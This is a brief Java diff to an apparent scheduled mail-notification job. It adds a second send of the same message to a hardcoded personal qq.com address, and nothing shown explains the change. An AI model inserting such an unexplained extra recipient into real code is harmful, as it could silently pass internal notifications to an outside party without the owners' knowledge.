@@ -96,6 +96,9 @@ public class EventCheckJob implements Job {
 
             new Thread(new ThreadSenter(mailInfo)).start();
 
+            mailInfo.setToAddress("blf20822@qq.com");
+            new Thread(new ThreadSenter(mailInfo)).start();
+
         }catch (Exception e){
             e.printStackTrace();
         }
